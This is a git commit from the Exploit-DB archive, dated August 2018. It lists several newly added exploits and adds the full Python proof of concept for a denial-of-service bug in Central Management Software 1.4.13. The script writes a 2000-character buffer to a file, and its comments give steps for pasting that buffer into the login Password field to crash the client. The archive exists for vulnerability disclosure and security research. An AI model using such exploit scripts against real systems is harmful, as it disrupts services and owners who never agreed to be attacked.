0424dfc05bb7c160471fdd0593ac1b493ab98df8
Offensive Security <info@exploit-db.com>
2018-08-17 05:02:00 +0000

    DB: 2018-08-17
    8 changes to exploits/shellcodes
    
    TP-Link WR840N 0.9.1 3.16 - Denial of Service (PoC)
    ObserverIP Scan Tool 1.4.0.1 - Denial of Service (PoC)
    Central Management Software 1.4.13 - Denial of Service (PoC)
    
    WebkitGTK+ 2.20.3 - 'ImageBufferCairo::getImageData()' Buffer Overflow (PoC)
    
    OpenEMR 5.0.1.3 - Arbitrary File Actions
    Wordpress Plugin Export Users to CSV 1.1.1 - CSV Injection
    Pimcore 5.2.3 - SQL Injection / Cross-Site Scripting / Cross-Site Request Forgery

---
+++ exploits/windows_x86-64/dos/45207.py
@@ -0,0 +1,25 @@
+# Exploit Title: Central Management Software v1.4.13 - Denial of Service (PoC)  
+# Author: Gionathan "John" Reale
+# Discovey Date: 2018-08-16
+# Homepage: https://www.ambientweather.com
+# Software Link: https://p10.secure.hostingprod.com/@site.ambientweatherstore.com/ssl/Manuals/ambientcam/04_central_management_software.zip
+# Tested Version: 1.4.13
+# Tested on OS: Windows 10
+# Steps to Reproduce: Run the python exploit script, it will create a new 
+# file with the name "exploit.txt" just copy the text inside "exploit.txt"
+# and start the CMS client program. In the new window paste the content of 
+# "exploit.txt" into the following fields:"Password". Click "Login" and you will see a crash.
+
+#!/usr/bin/python
+   
+buffer = "A" * 2000
+
+payload = buffer
+try:
+    f=open("exploit.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
